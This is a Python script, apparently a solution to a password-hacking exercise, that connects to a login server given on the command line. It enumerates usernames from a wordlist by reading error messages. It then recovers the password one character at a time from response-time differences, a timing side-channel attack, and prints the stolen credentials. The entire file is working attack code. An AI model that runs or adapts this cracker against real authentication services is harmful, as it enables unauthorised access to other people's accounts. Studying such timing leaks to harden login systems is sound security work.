import sys
import socket
import itertools
import json
from datetime import datetime


class Socket:

    def __init__(self, host, port):
        self.host = host
        self.port = int(port)
        self.password = ''
        self.address = (self.host, self.port)
        self.json_login = {}
        self.admin = ''

    def connection(self):
        with socket.socket() as new_socket:
            new_socket.connect(self.address)
            self.admin = self.user_login(new_socket)
            self.password = self.password_login(new_socket)
            self.json_login = {"login": self.admin, "password": self.password}
            return self.json_login

    def user_login(self, _socket):
        with open('logins.txt', 'r') as f:
            for line in f:
                user = line.strip('\n')
                login_dict = {"login": str(user), "password": " "}
                self.json_login = json.dumps(login_dict)
                _socket.send(self.json_login.encode())
                response = json.loads(_socket.recv(1024).decode())
                if response['result'] == "Wrong password!":
                    return str(user)

    def password_login(self, _socket):
        iterable = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        while True:
            for letter in iterable:
                temp_password = self.password + letter
                login_dict = {"login": self.admin, "password": str(temp_password)}
                self.json_login = json.dumps(login_dict)
                _socket.send(self.json_login.encode())
                start = datetime.now()
                response = json.loads(_socket.recv(1024).decode())
                finish = datetime.now()
                difference = (finish - start).total_seconds()
                if difference >= 0.1:
                    self.password = self.password + letter
                    break
                elif response['result'] == "Connection success!":
                    self.password = self.password + letter
                    return self.password


if __name__ == "__main__":
    login = Socket(*sys.argv[1:]).connection()
    print(json.dumps(login))